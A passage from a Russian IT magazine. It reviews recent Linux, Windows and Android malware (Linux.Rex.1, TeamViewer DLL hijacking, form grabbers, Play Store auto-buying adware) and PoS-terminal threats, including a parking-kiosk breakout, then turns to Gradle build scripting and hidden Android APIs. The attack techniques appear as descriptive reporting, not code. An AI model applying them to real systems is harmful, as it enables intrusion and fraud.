с требованием выкупа и организация DDoS-атак. Но обо всем по порядку.
  Начнем с того, что этот трой, написанный на языке Go, по-видимому, все
еще находится в стадии разработки и активного допиливания. Иначе невоз-
можно объяснить, почему при работе он генерирует значительное количе-
ство отладочных сообщений, которые записывает в файл на устройстве /dev/
null. Троянец имеет несколько модулей. Один из них сканирует сеть в поис-
ках сайтов под управлением популярных движков вроде Drupal, для чего ищет
индексную страницу сайта и файл Changelog.TXT, а потом проверяет в них
наличие характерных строк. Затем Linux.Rex.1 с использованием уязвимости
CVE-2014-3704 выполняет SQL-инъекцию в форму для ввода логина и меня-
ет аутентификационные данные в администраторской учетке. Заходит админ
на сайт и наблюдает вот такую прелестную картину:





                                                                  Сайт залочен

Если взлом удался, трой загружает на сайт бинарный файл с собственной ко-
пией и запускает его на исполнение. Таким образом, Linux.Rex.1 реализует
механизм саморепликации, то есть умеет распространяться автоматически,
без участия пользователя.
  Помимо этого, данная малварь может рассылать по электронной почте пись-
ма с угрозами. Например, обещает владельцам сайтов организовать DDoS-а-
таку. Чтобы избежать этой участи, потенциальная жертва должна заплатить вы-
куп в биткойнах. В своих сообщениях трой даже просит получателя переслать
письмо ответственному сотруднику компании, если оно пришло не по назна-
чению. Причем угрозы эти не пустые: Linux.Rex.1 умеет проводить DDoS-атаки
методами HttpFlood, HttpPost, slowLoris, tlsThc и DnsAmp. Но самое инте-
ресное заключается в том, что он способен организовываться в одноранговые
децентрализованные P2P-ботнеты. Для этого в его архитектуре предусмотрена
собственная реализация протокола DHT. Одним словом, не троянец, а самый
настоящий вредоносный комбайн. Хранящий логи в /dev/null :).
   Вообще, складывается впечатление, что придуманный парнями из Google
язык Go очень популярен среди разработчиков малвари под Linux. Например,
троянец под названием Linux.Lady.1 написан на нем же. Этот трой предназна-
чен для скачивания и запуска на зараженном устройстве программы — майне-
ра криптовалют и тоже обладает своеобразным механизмом самораспростра-
нения, правда весьма примитивным и хромым на обе ноги. Он обращается
к одному из интернет-сайтов, чтобы определить свой IP-адрес, на основе по-
лученного значения вычисляет маску подсети External_ip\8 (маска 255.0.0.0)
и пытается подключиться к удаленным узлам через порт 6379, используемый
Redis. Если подключение удалось, троянец предпринимает попытку авторизо-
ваться без пароля.
   Разумеется, это возможно только в том случае, если «редиска» настроена,
мягко говоря, неправильно. И тем не менее кошельки, на которые Linux.Lady.1
сливает намайненное, вполне себе живые. Что однозначно подтверждает: ин-
тернет до сих пор не оскудел грамотными и талантливыми админами.





                 Даже такое кривое самораспространение находит свою аудиторию


ВАШ ПЕРСОНАЛЬНЫЙ «МЕНЕДЖЕР»
Если говорить о платформе Microsoft Windows, то здесь хитом сезона стали
троянцы, использующие для своих вредоносных целей популярную утилиту
удаленного администрирования под названием TeamViewer. Таковых на се-
годняшний день известно очень много (проект Spy-Agent, к которому отно-
сится значительная их часть, развивается аж с 2011 года).
   Как работают подобные троянцы? Здесь мы должны вспомнить одну ха-
рактерную конструктивную особенность винды. Если какому-либо процессу
требуется для работы динамическая библиотека, Windows сначала попытает-
ся найти нужный файл в папке, откуда был запущен сам процесс, и лишь по-
том обратится к системным директориям. Это и поворачивают к собственной
выгоде вирусописатели: приложение TeamViewer действительно использует
стандартную библиотеку avicap32.dll, по умолчанию живущую в %SYSTEMROOT%/
System32/, однако злодеи сохраняют на диск вместе с настоящими файлами
TeamViewer и поддельную библиотеку с тем же именем, причем хранится она
в папке самого приложения. В результате при запуске TeamViewer загружает
в память вредоносную копию avicap32.dll вместо подлинной.
  Раньше вирусописатели этим и ограничивались (вся функциональность
была сосредоточена в самой библиотеке), однако создатели троянца под на-
званием BackDoor.TeamViewerENT.1 решили, что негоже добру пропадать,
и стали использовать возможности TeamViewer на полную катушку.
   Трой отключает показ ошибок для приложения TeamViewer и устанавлива-
ет хуки в его адресном пространстве. Кроме того, в нем хранится список кон-
трольных сумм файлов TeamViewer, и BackDoor.TeamViewerENT.1 регулярно
проверяет их с помощью функции API MapFileAndCheckSumA. Если для нор-
мальной работы TeamViewer на атакованном компьютере не хватает каких-ли-
бо файлов, троянец скачивает их со своего управляющего сервера. Благодаря
этим ухищрениям бэкдор может выключить и перезагрузить компьютер, запи-
сать звук с микрофона и включить трансляцию через веб-камеру, запустить
и перезапустить TeamViewer, скачать и выполнить любые приложения, подклю-
читься по указанному адресу, после чего запустить cmd.exe с перенаправле-
нием ввода-вывода на удаленный хост — и это далеко не все.
  В  отличие  от многих  других  бэкдоров, наш подопытный  рассчитан
не на массовое распространение, а, скорее, на индивидуальную работу с ка-
ждой жертвой. Распространители этого троянца атакуют в основном жителей
ряда определенных стран и регионов. Судя по комментариям, которые злодеи
оставляют в предназначенных для управления зараженными машинами ад-
минках, BackDoor.TeamViewerENT.1 используется в основном для кражи денег
с банковских счетов и счетов электронных платежных систем, а также для вы-
полнения несанкционированных транзакций. Комментарии эти говорят еще
и о том, что распространители вирусов развлекаются с зараженными машина-
ми и отжигают на полную катушку. На иллюстрации мы скрыли их только из со-
ображений человеколюбия и гуманности.





                           Не хотелось бы увидеть свой айпишник в таком списке


СТАРЫЕ ДОБРЫЕ ГРАББЕРЫ
Никуда не исчезли и троянцы, предназначенные для хищения конфиденциаль-
ной информации. Например, такие, как Trojan.PWS.AlphaLeon.1 и Trojan.
PWS.AlphaLeon.2. Эти вредоносные программы реализуют функции граббе-
ра — они перехватывают вводимую пользователями информацию в окне бра-
узера и передают ее злоумышленникам. Если покопаться в коде Trojan.PWS.
AlphaLeon.2, можно даже отыскать зачатки модуля, предназначенного для вы-
полнения веб-инжектов, но он, судя по всему, еще не допилен. В остальном
троянцы семейства Trojan.PWS.AlphaLeon на первый взгляд не представляют
собой ничего необычного: регистрируются через реестр в автозагрузке, пе-
редают на управляющий сервер сведения об инфицированной машине и ОС,
пытаются определить наличие в окружении виртуальных машин, перехватыва-
ют содержимое заполняемых пользователями форм... Примечательна разве
что одна пасхалка, спрятанная вирусописателями в ресурсах троянца:





                                                                    Привет, Кребс!

Хорошенько приглядевшись к этой своеобразной пиксельной графике, мы мо-
жем различить на картинке надпись Krebs Security, а также портрет человека,
напоминающего старину Брайана Кребса. Такой вот «привет» от вирмейкеров
экспертам по информационной безопасности.

МОБИЛЬНЫЕ ПРИЛОЖЕНИЯ ПОКУПАЮТ ДРУЗЕЙ
Растет количество угроз и для мобильной платформы Android. Оно и неуди-
вительно: с точки зрения вирусописателей, среднестатистический владелец
Android-смартфона или планшета — это ходячий кошелек, к содержимому
которого обязательно нужно приобщиться. Способов для этого есть много:
можно втихаря рассылать платные эсэмэски, можно показывать пользователю
рекламу, можно воровать деньги из банковского приложения, а то и вовсе за-
блокировать экран смартфона и потребовать выкуп.
  Больше всего среди Android-троянцев рекламных программ. Вот, напри-
мер, Android.Slicer.1.origin. Вроде бы полезная утилита — может показывать ин-
формацию об использовании оперативной памяти и завершать работу ненуж-
ных процессов, позволяет включать и отключать беспроводные модули Wi-Fi
и Bluetooth. Ан нет, скрыта в ней, как в пресловутой лукасовской Силе, и тем-
ная сторона. Этот троянец передает своим хозяевам сведения о зараженном
телефоне, а потом по команде показывает на экране навязчивую рекламу, от-
крывает в браузере или в каталоге Google Play различные ссылки или помеща-
ет ярлыки на главный экран Android.





  Приложение                    Имитация бурной          Виджет как виджет
  как приложение                   деятельности

   Этот  троянец  мож-
но посчитать типичным
для Android, но отличи-
тельная  черта  Android.
Slicer.1.origin  заключа-
ется в том, что он мо-
жет  не  только  рекла-
мировать   программы
в Google Play, но и по-
купать и устанавливать
их. В этом ему помо-
гает  другой  троянец
под  именем   Android.
Rootkit.40, который жи-
вет в системном  раз-
деле /system/bin. Эта
«сладкая парочка» умеет        Внезапно баннеры             Поверх всех
находить в коде откры-        на весь экран                 приложений или
                                                       ОС можно даже
тых  страниц  элементы                                                                 крутить видео
управления,  например
кнопки   с   идентифи-
катором com.android.vending:id/buy_button («Купить» и «Установить»)
и com.android.vending:id/continue_button (кнопка «Продолжить»). По-
том троянец определяет координаты середины этих кнопок и нажимает на них,
пока они не исчезнут с экрана. Для этого используется стандартная утилита
uiautomator, предназначенная для тестирования графического интерфей-
са Android. Правда, проделать эти фокусы Android.Slicer.1.origin и Android.
Rootkit.40 могут только в Android 4.3, так как идентификаторы нужных кнопок
встречаются лишь в этой системе (и выше), а Android.Rootkit.40 не может ра-
ботать на устройствах с активным SELinux (Android 4.4 и выше).

ЗАКЛЮЧЕНИЕ
Как мы видим, вирусописатели всегда найдут способ обхитрить простого
пользователя, поэтому нужно постоянно быть начеку. Ну а мы искренне же-
лаем здоровья вам, вашим компьютерам, смартфонам, планшетам и прочим
гаджетам.
MALWARE: Колонка Дениса Макрушина
НОВЫЕ УГРОЗЫ
  ДЛЯ СТАРЫХ
POS-ТЕРМИНАЛОВ





                      Денис Макрушин
                                                      defec.ru, twitter.com/difezza


Казалось бы, не так давно мир узнал об угрозах, специ-
ально разработанных для необычных, наполненных всам-
делишными деньгами компьютеров — банкоматов. Про-
шло несколько лет, и ряды «необычных компьютеров»
пополнились новыми устройствами для торговых опера-
ций и приема к оплате платежных карт — PoS-терминала-
ми (point of sales, точка продаж).




2013 год ознаменовался инцидентом, который затронул жителей США: дан-
ные более 40 миллионов банковских карт и информация о более чем 70 мил-
лионах клиентов крупной торговой сети Target оказались в руках злоумыш-
ленников. При расследовании выяснилось, что причиной инцидента стала
не компрометация системы процессинга платежей или серверов компании,
а зараженные кассовые аппараты и PoS-терминалы. Вредоносное программ-
ное обеспечение, установленное на них злоумышленниками, перехватывало
платежные данные, находящиеся в оперативной памяти устройства в откры-
том виде. В 2014 году ситуация с терминалами повторилась в другой торговой
сети, Home Depot, и привела к утечке данных с 56 миллионов карт.
   Эти инциденты показали, что злоумышленники не только пристально сле-
дят за трендами развития технологий и устройств приема и обработки плате-
жей, но и непрерывно разрабатывают специализированное вредоносное про-
граммное обеспечение для кражи ценных финансовых данных.
  До масштабных взломов розничной сети проблема вредоносных программ
для PoS-терминалов не столько игнорировалась, сколько просто не при-
влекала внимание общественности и СМИ, несмотря на то что PoS-зловре-
ды атаковали различные предприятия по крайней мере с 2010 года. Так, еще
в 2010 году мир узнал о зловреде Trojan-Spy.Win32.POS (также известном
как CardStealer), который искал данные платежной карты на зараженной ра-
бочей станции и передавал найденную информацию на сервер злоумышлен-
ников. С тех пор антивирусные эксперты каждый год обнаруживают все новые
и новые экземпляры вредоносного ПО, разработанного для кражи платежных
данных с PoS-терминалов.





                                    Хронология обнаружения угроз для PoS-терми-
                                   налов (источник: «Лаборатория Касперского»)

В настоящее время заражение PoS-терминалов уже вышло за пределы то-
чечных атак, и киберпреступники получили новый плацдарм для реализации
угроз, который позволяет ближе всего подобраться к чужим деньгам.

ОС общего назначения против вредоносного ПО конкретного
назначения
Жизнь злоумышленников отчасти упрощается тем, что PoS-устройства на са-
мом деле обычные компьютеры, которые также могут использоваться (и порой
используются, особенно в сфере малого бизнеса) для «общих целей», в том
числе для серфинга в Сети и проверки электронной почты. Это означает, что
преступники в некоторых случаях могут получить удаленный доступ к таким
устройствам.
   Зловред Dexter, обнаруженный в 2012 году, воровал реквизиты банковских
карт, атакуя торговые терминалы, находящиеся под управлением ОС семей-
ства Windows. Он внедрялся в системный процесс iexplore.exe, считывал опе-
ративную память и искал платежные данные, достаточные для изготовления
поддельной пластиковой карты (имя владельца, номер счета, срок годности
и номер карты, включающий код эмитента, класс и тип карты, и так далее), за-
тем отправлял собранную информацию на удаленный сервер, подконтроль-
ный злоумышленникам.





               Примеры команд, которые Dexter принимал от управляющего сервера

Dexter за время своего существования успел поразить сотни PoS-систем
в широко известных сетях розничной торговли, отелей, ресторанов, а также
на частных парковках. И как можно догадаться, большая часть рабочих стан-
ций жертв находилась под управлением операционной системы Windows XP.
   Другим печально известным примером стала угроза, получившая назва-
ние Backoff. Этот PoS-троян разработан для кражи с платежных терминалов
информации о картах. Подобно Dexter, этот зловред читал оперативную па-
мять PoS-терминала, чтобы получить данные платежных карт. Кроме того, не-
которые версии Backoff содержали компонент перехвата клавиатурного ввода
(кейлоггер) предположительно на тот случай, если он окажется не на PoS-тер-
минале, а на обычной рабочей станции, которая также может быть использо-
вана для платежей (а значит, пользователь будет вводить ценную информацию
с клавиатуры).

Точки продаж в «неторговых» местах
В настоящее время PoS-устройства могут ждать своих пользователей не толь-
ко в торговых сетях, супермаркетах или гостиницах. Парки и улицы пестрят
терминалами оплаты парковки всевозможных средств перемещения и уютны-
ми «будками» быстрой подзарядки мобильного девайса. Аэропорты и вокза-
лы предлагают получить справочную информацию и оплатить билеты через
различные устройства. В кинотеатрах находятся терминалы покупки и брони-
рования билетов на киносеансы. В поликлиниках и государственных учрежде-
ниях посетителей встречают устройства электронных очередей и печати кви-
танций. В некоторых местах даже туалеты оснащаются терминалами оплаты!
  При этом далеко не все из подобных устройств достаточно хорошо защи-
щены. Например, летом 2014 года эксперты одной антивирусной компании об-
наружили в терминалах парковки недостатки конфигурации, которые позволя-
ли скомпрометировать устройства и, как следствие, пользовательские данные
(включая платежные).
   Приложение для паркоматов, работающих на базе операционной системы
семейства Windows, позволяет пользователю зарегистрироваться и получить
справочную информацию о местоположении паркомата и других велосипед-
ных парковок. Отображение всего этого, а также баров, кафе и прочих объ-
ектов реализовано с помощью виджета компании Google. У пользователя нет
возможности свернуть полноэкранное приложение и выйти за его пределы,
однако именно в нем и кроется недостаток конфигурации, который позволяет
скомпрометировать устройство: в правом нижнем углу виджета содержатся
ссылки «Сообщить об ошибке», «Конфиденциальность» и «Условия использо-
вания», после нажатия на которые запустится браузер Internet Explorer.





                        Пример эксплуатации уязвимостей приложения паркомата


Варианты использования таких недостатков конфигурации зависят лишь
от фантазии злоумышленника. К примеру, атакующий может извлечь пароль
администратора, хранящийся в памяти в открытом виде. Кроме того, можно
получить слепок памяти приложения велопарковки. Возможно, из него затем
удастся извлечь личную информацию его пользователей: ФИО, адрес элек-
тронной почты и телефон — подобная база верифицированных адресов и те-
лефонов будет иметь особую ценность на черном рынке киберпреступников.
Злоумышленник также может установить кейлоггер, перехватывающий все
введенные данные и отправляющий их на удаленный сервер, или, добавив поля
для ввода дополнительных данных, реализовать сценарий атаки, результатом
которой станет получение еще большего количества персональных данных.

Default Deny
Финансовые организации и организации, эксплуатирующие PoS-терминалы,
должны уделять больше внимания защите своих устройств, и не только без-
опасности их аппаратной составляющей, но и безопасности их операцион-
ных систем, а также всей сетевой информационной инфраструктуры. В этом
помогут средства защиты, которые уже давно применяются в корпоратив-
ных сетях, и специализированные решения для обеспечения безопасности
embedded-систем.
   Оборудование точек продаж представляет не меньшую ценность для вла-
дельца, чем одинокий банкомат в торговом центре для банка-владельца.
И если хозяева банкоматов с каждым новым инцидентом все лучше понима-
ют, что защищать устройства необходимо, то многие владельцы PoS-термина-
лов по-прежнему расплачиваются за свою беспечность. Запрет по умолчанию
и полнодисковое шифрование — методы, которые нельзя назвать инноваци-
онными, но они всё так же эффективны для защиты «железного мешка с день-
гами».
CODING
   ЗАВОДНОЙ
   СКРИПТИНГ
  ДЛЯ ANDROID


           ЗНАКОМИМСЯ
        С КРУТОЙ СИСТЕМОЙ
          АВТОМАТИЧЕСКОЙ
           СБОРКИ GRADLE





Артур Глызин



Большинство программистов, разрабатывающих
для Android, хотя бы слышали о системе автоматической
сборки Gradle. При этом, по моим наблюдениям, лишь не-
многие из использующих эту систему кодеров уделяют до-
статочно времени, чтобы как следует изучить ее возмож-
ности :). Самая частая причина звучит так: «Да ладно, это ж
просто скрипт сборки, у меня есть задачи поважнее».

А ведь на самом деле Gradle может быть очень полезен как для простой на-
стройки сборки, так и для решения весьма нестандартных задач! Об этом
и пойдет речь сегодня.

ANDROID GRADLE PLUGIN
Gradle сам по себе ничего не знает о том, как билдить Android-проект, в этом
ему помогает плагин, который разрабатывается вместе с Android SDK. Если
ты только недавно начал осваивать программирование под Android, то мог
и не заметить, что в главном сборочном скрипте build.gradle студия само-
стоятельно добавляет зависимость от этого плагина.





А в скрипте твоего основного модуля этот плагин автоматически подключает-
ся строчкой apply plugin: 'com.android.application'. Именно поэтому
у тебя в скрипте есть секция android { ... }, в которой ты указываешь вер-
сию Build Tools, версии SDK для сборки и прочее.
   Перед тем как мы попытаемся глубже разобраться в работе самого Gradle,
я покажу тебе несколько полезных вещей, которые умеет делать этот плагин
и о которых ты мог не знать.

Добавляем свои поля в BuildConfig
BuildConfig — это автоматически генерируемый при сборке класс, который со-
держит только константы. Этот класс генерируется отдельно для каждого мо-
дуля в твоем проекте и по умолчанию включает в себя информацию об ID при-
ложения, версии, типе сборки.





Редактирование вручную этого файла бесполезно, так как он все равно пере-
затрется новыми данными при сборке. Зато Android-плагин может добавлять
в него те поля, которые ты скажешь.





Первый параметр — тип константы, второй — имя, третий — значение, все
просто. Заметь, что значение поля TIMEOUT вычисляется на этапе сборки
и в BuildConfig попадет уже как число 300 000. Теперь ты можешь конфигуриро-
вать свой любимый HTTP-клиент, просто ссылаясь на константы в BuildConfig.





Добавляем свои данные в ресурсы
Принцип точно такой же, что и с BuildConfig, но позволяет добавлять значе-
ния в файл ресурсов. Но зачем добавлять ресурс из конфига, если проще
это сделать, как обычно, в XML-файле? Просто потому, что в скрипте, так же
как и в случае с BuildConfig.TIMEOUT, значение ресурса можно вычислить. На-
пример, сохранить дату сборки:


Gradle создаст специальный файл generated.xml примерно такого содержания:





И пусть тебя не смущает, что мы храним время в формате String. К сожалению,
Android SDK не умеет хранить в ресурсах long, а в 32-битный integer время
не влезет.

Создаем разные варианты сборки
Пожалуй, уже все Android-программисты знают о существовании встроен-
ных типов сборок debug и release. Чуть меньше — о том, что можно соз-
давать свои типы сборок. Еще меньше тех, кто дополнительно применяет
productFlavors. Но давай по порядку.


    ...Все Android-программисты знают о существовании встроенных типов
 сборок debug и release. Чуть меньше — о том, что можно создавать свои типы
 сборок. Еще меньше тех, кто дополнительно применяет productFlavors.



Мы используем build types, чтобы иметь возможность собирать приложение
с существенными отличиями. Эти отличия обычно связаны с тем, как мы соби-
раем приложение: для отладки или для релиза, с обфускацией кода или без,
каким сертификатом оно будет подписано.





Чтобы собрать нужный тип, выполняем команду gradle  assemble<ИмяТи-
паСборки>, например gradle assembleDebug или gradle assembleQa.

INFO

Есть два пути настройки Gradle. Ты можешь установить его на машину само-
стоятельно или использовать Gradle Wrapper внутри проекта. В первом слу-
чае Gradle будет доступен тебе глобально через команду gradle из консоли.
Во втором случае сборку можно запускать через специальную программу-о-
бертку — gradlew. Второй способ предпочтительнее, так как может работать
с любой версией Gradle без переустановки. Тем более что при создании про-
екта в Android Studio этот способ работает по умолчанию. Подробнее о Gradle
Wrapper ты можешь почитать по ссылке.


Product flavors дополняют build types и вносят еще один уровень гибкости в на-
стройку сборки. Используй их, когда нужно, скажем так, не глобально изме-
нить приложение, — это могут быть брендинг (иконки, цвета, тексты), окруже-
ние (адрес сервера, платформа, trial- или pro-версии).





Build type и product flavor в сумме дают так называемый итоговый Build Variant,
собрать который можно по схеме gradle  assemble<ИмяПродукта><ИмяТи-
паСборки>. Если ты хочешь запустить эти сборки не из консоли, а из студии, от-
крой вкладку Build Variants и выбери то, что тебе нужно, из списка, как на рис. 1.





                                             Рис. 1. Выбор Build Variant в Android Studio




Каждая из секций buildTypes и productFlavors  {...} может иметь свои
buildConfigField {...}, resValue, versionName и другие параметры, кото-
рые будут приоритетнее, чем те, что объявлены в defaultConfig {...}.

 Настраиваем информацию о приложении
Имея несколько вариантов сборок, ты точно захочешь их идентифицировать
или различать после установки. Как раз для этого у Android-плагина есть па-
рочка параметров — applicationIdSuffix и versionNameSuffix, которые до-
бавляют к существующему ID приложения и к существующей версии то, что ты
пожелаешь.





С таким конфигом команда gradle assembleTrialRelease соберет тебе при-
ложение с applicationId="example.myawesomeapp.release" и названием версии
MyAwesomeApp-trial.
   Заканчивая тему с Android-плагином для Gradle, нужно сказать, что это
только часть его возможностей. Плагин постоянно развивается и приобретает
новые фичи. На сайте tools.android.com есть подробный гайд по его использо-
ванию.

GRADLE DSL
А теперь давай попробуем  разобраться, почему конфигурация сборки
в Gradle называется скриптом, из чего состоит этот скрипт и почему он выгля-
дит так, как выглядит. Gradle часто называют объединением систем сборки Ant
и Maven. С одной стороны, Gradle, как и Maven, обеспечивает декларативный
подход к сборке, когда программист лишь объявляет нужные значения и па-
раметры, а система сама знает, как сделать всю остальную работу самостоя-
тельно. Именно этим мы занимались в предыдущей части.
  С другой стороны, Gradle, как и Ant, умеет выполнять команды, но пишутся
они не в XML-файле, а уже с помощью Gradle DSL (domain-specific programming
language), написанном на Groovy. В мире Gradle эти команды называются
Tasks (задачи). Задачи можно делать зависимыми от других задач и таким об-
разом строить граф их выполнения. По сути, цепочка задач и установленные
параметры и есть скрипт сборки приложения.
  В прошлой части статьи, когда мы выполняли команды вроде gradle
assembleRelease, на самом деле мы запускали уже готовую одноименную за-
дачу. Она не взялась из ниоткуда, ее нам подготовил Android-плагин. Ты всег-
да можешь посмотреть список доступных команд, выполнив gradle  tasks.
Попробуй, и ты увидишь, как много задач тебе уже предоставлено.





                                       Рис. 2. Типичный набор задач в Android-проекте

Стандартные команды ты можешь изучить, запуская их с помощью gradle
help или gradle install. А как насчет собственных задач? Легко — давай же
скорее напишем Hello Gradle!





Добавь эту задачу в свой build-скрипт, и ты сможешь запустить ее gradle hello.
Она появится также в списке задач (gradle tasks) в разделе Other tasks. Если
ты знаком с Groovy, ты сразу заметишь, что тело задачи — это просто замыка-
ние (closure) с кодом, печатающим слова. Вся мощь Gradle и заключается в том,
что в теле задачи можно писать Groovy-код, а значит, можно создавать задачи,
делающие что угодно, если это можно уложить в программный код.
  Прежде чем мы напишем что-то действительно полезное, давай я тебе по-
кажу еще пару примеров манипулирования задачами.

Пример 1: добавляем зависимости к задаче





Мы написали две задачи, печатающие отдельно слова Hello и world. Операция
<< эквивалентна вызову doLast{...} и используется для краткости записи.
Последняя задача greetings принимает в качестве зависимости массив других
задач. Если запустить ее, то она самостоятельно запустит все задачи, от кото-
рых зависит.





Есть еще один вариант установки зависимостей:



Этот способ работает, потому что задачи в Gradle — это объекты, у них есть
методы, их можно передавать в качестве параметра в функции.

Пример 2: динамическое создание задач
Подобно тому, как Android-плагин автоматически генерирует задачи под твои
build types и product flavors, ты сам можешь генерировать свои задачи.





Такой скрипт создаст тебе пять задач с именами task0, tasl1 и так далее.

ПРАКТИКА
ОK, ближе к делу, давай напишем что-нибудь полезное. Многие проекты со-
стоят не только из одного основного модуля app, но и из нескольких вспо-
могательных, каждый из которых имеет свой скрипт build.gradle со своими
настройками. При обновлении Android SDK становится утомительно обнов-
лять каждый из скриптов отдельно и редактировать в них compileSdkVersion,
buildToolsVersion, targetSdkVersion... Зато можно написать задачу, которая
сделает это самостоятельно. Открой скрипт build.gradle в корне своего проек-
та, найди в нем секцию allprojects {...} и добавь такой код:





У Gradle API есть метод subprojects, который принимает на вход замыкание
и вызывает его для каждого подмодуля в проекте. В теле функции-замыкания
мы проверяем, относится ли модуль к Android, и, если да, заменяем все, что
относится к версии Build Tools и версии SDK.
  Следующая задача посложнее: автоматизировать подстановку версии при-
ложения (versionCode и versionName). Давай представим, что в проекте ис-
пользуется Git, каждый релиз помечается соответствующим тегом в форма-
те release2.3.4. Тогда в качестве versionName можно будет брать имя самого
свежего тега, а versionCode будет равняться количеству этих тегов. В качестве
бонуса сгенерируем файл с историей релизов.
   Для начала нужно написать функцию, вытаскивающую с Git всю нужную ин-
формацию.





Суть функции в том, что она выполняет консольную команду git for-each-
ref, доставая все теги, начинающиеся с release, в формате ИмяТега-Сообще-
ниеТега и возвращает их списком строк. Получается что-то вроде:

release2.1.2-Improvements
release2.2.45-New features
release2.3.4-Hot  fix

Реальное значение зависит, конечно, от того, что на самом деле лежит в Git
проекта. Эту функцию мы можем использовать в секции android, чтобы запол-
нить значения versionCode и versionName:





Автоподстановку версии мы настроили. Осталось записать список релизов
в файл. Сделаем для этого новую задачу:





Так как Groovy — это дополнение к Java, у тебя в распоряжении весь стандарт-
ный Java API. Здесь, например, нам пригодился стандартный Java-класс File.
Чтобы генерировать этот файл не вручную, а вместе с билдом, подцепим нашу
задачу к какой-нибудь из уже имеющихся, например к preBuild:



ИТОГО
Мы посмотрели на штатные возможности Android-плагина для Gradle, немно-
го поковыряли Gradle API, поучились писать свои задачи. Разумеется, все это
только верхушка айсберга. Вокруг Gradle уже сформировалось большое ко-
мьюнити, и оно развивает и создает свои плагины: для деплоя, для тестиро-
вания, для статистики и кучу других, которые могут сделать твою жизнь лучше.
А если ты не найдешь то, что тебе нужно, то ты сможешь написать свой плагин
или задачу. Успехов!


            WWW

                            Несколько ресурсов с подборкой полезных Gradle-плагинов:

                              Android Arsenal

                             Best gradle plugins for Android dev


                                 Essential Gradle Plugins for Android Development

                            Видео: доклад о внутреннем устройстве Gradle (на английском):
                              Gradle under the hood (Dawid Kublik)
CODING
В ПОИСКАХ
СКРЫТЫХ API
О ТОМ, КАКИЕ
ФУНКЦИИ ANDROID
ПРЯЧЕТ ОТ ГЛАЗ
РАЗРАБОТЧИКОВ

                                                                              Евгений Зобнин
                                                                                            zobnin@gmail.com





В одной из своих предыдущих статей я уже писал о меха-
низме под названием «уровень доступа» (protection level),
который определяет, может ли твой код обращаться к тем
или иным функциям ОС. Высокий уровень доступа полу-
чает только системный софт, поэтому для простых смерт-
ных он закрыт. Однако есть в Android и еще одна инте-
ресность, имя которой — скрытый API. И чтобы получить
к нему доступ, не нужен root, не надо подписывать прило-
жение ключом прошивки, достаточно лишь немного по-
раскинуть мозгами.

Intro
Написать эту статью подвигла одна история. Началась она с попытки создать
простенькое приложение, которое позволяло бы разворачивать строку состо-
яния свайпом с какой-то из сторон экрана. Современные смартфоны слишком
велики, чтобы дотянуться до статусбара одной рукой, а свайп позволил бы ре-
шить эту проблему быстро и легко.
   Подобная функция есть во многих лаунчерах, поэтому задача казалась про-
стой и совершенно очевидной: завариваем кофе, открываем доки Android, на-
ходим нужную функцию и пишем простой сервис, который отслеживал бы ка-
сание края экрана и разворачивал статусбар.
  Но жестокая реальность поубавила оптимизма: как следовало из докумен-
тации Android, API не предоставлял такую функциональность! А значит, софт,
умеющий разворачивать строку состояния, использовал хаки, а что еще более
интересно — хаки, работающие без root, прав администратора и вообще ка-
ких бы то ни было разрешений.

Начинаем разбираться
Проще всего выяснить, как это вообще возможно, — посмотреть чужой код.
Такого с ходу не нашлось, зато обнаружилась очень простая софтина Drop
Down Status Bar. Она состояла из иконки, при нажатии которой разворачивал-
ся статусбар, а сам код приложения умещался в файле размером 1252 байт —
идеальный кандидат для декомпиляции.
   Оставалось только скачать APK и натравить на него jadx:





                               Декомпилированный листинг Drop Down Status Bar

Очень простой код, который создает объект класса StatusBarManager и вызы-
вает его метод expandNotificationPanel(), если приложение работает в сре-
де Android 4.2, или метод expand(), если это Android предыдущих версий. Все
очень просто, и код можно было банально скопировать в свое приложение:





                                                                                                  Упс...

Но не тут-то было. Оказалось, что класс StatusBarManager не просто не был
описан в документации, — его вообще не существовало в SDK. Как же рабо-
тал Drop Down Status Bar?
  На самом деле все элементарно. Фреймворк, содержащий все классы па-
кета android (включая требуемый android.app.StatusBarManager), не один и тот
же на реальном устройстве и в SDK. Версия фреймворка в SDK, во-первых,
довольно сильно урезана в плане доступных классов, а во-вторых, не включает
в себя самого кода реализации классов (вместо методов и конструкторов —
заглушки).





                            Содержимое фреймворков реального устройства и SDK

Это теория, а практика в том, что выдернутый с устройства фреймворк по ло-
гике можно было бы использовать не только чтобы сравнить с тем, что постав-
ляется в SDK, но и чтобы подменить его! Сделать это оказалось несложно.

Кручу, верчу, запутать хочу
Фреймворк был выдернут с устройства (что такое adb shell):

$ adb shell
> su
> cp /system/framework/framework.jar /sdcard/
> exit
> exit
$ adb pull /sdcard/framework.jar

С помощью dex2jar байт-код Dalvik был транслирован обратно в байт-код Java:

$ unzip framework.jar
$ dex2jar-2.0/d2j-dex2jar.sh classes.dex

И затем размещен в проекте как обычная библиотека:

$ cp classes-dex2jar.jar ~/AndroidstudioProjects/ИМЯ_ПРИЛОЖЕНИЯ/
    app/libs/

Оставалось только запустить Android Studio, выбрать библиотеку и присоеди-
нить ее к проекту с помощью меню «Add as library».


Получившийся  classes-dex2jar.jar  можно  было  бы  переименовать
в android.jar и положить его в SDK/platforms/android-23, заменив оригинал.
Но это не самая лучшая идея, так как изменение отразилось бы на всех осталь-
ных проектах.



Но Android Studio продолжал упорствовать. Теперь ему не нравилось слово
statusbar:



Оказалось, однако, что неправ в этой ситуации как раз Android Studio и это
не что иное, как баг, обойти который можно с помощью комментария-дирек-
тивы noinspection:





                                       Заставляем Android Studio принять наш код

Вот и все... нет, стоп, это я выдаю желаемое за действительное. На самом
деле это еще далеко не все. Из-за огромного веса фреймворка Android Studio
задыхался во время компиляции и постоянно прерывал этот процесс с самы-
ми разными ошибками. И ошибки эти были вовсе не в коде, а в самих инстру-
ментах сборки. И даже не ошибки, а расход всей оперативной памяти, из-за
которого инструменты сборки просто падали, как, например, утилита dx, пере-
гоняющая байт-код Java в байт-код Dalvik:

Error:Execution failed for task
':app:transformClassesWithDexForDebug'

Решение этому нашлось не сразу, и поначалу казалось, что нечего даже пы-
таться собрать код на ноуте с четырьмя гигами памяти. Однако и это было воз-
можно, но только если указать Android Studio альтернативный каталог для хра-
нения временных файлов (по умолчанию в Linux он использует каталог /tmp,
который зачастую сам находится в оперативке), подключить swap и провести
небольшой тюнинг системы сборки.
   Первые две задачи решились просто:

$ export _JAVA_OPTIONS="-Djava.io.tmpdir=$HOME/tmp"
$ dd if=/dev/zero of=swap.img bs=1m count=4096
$ mkswap swap.img
$ sudo swapon swap.img

Вторая чуть сложнее. Пришлось слегка подредактировать build.gradle
проекта, чтобы выделить побольше памяти виртуальной машине Java, от-
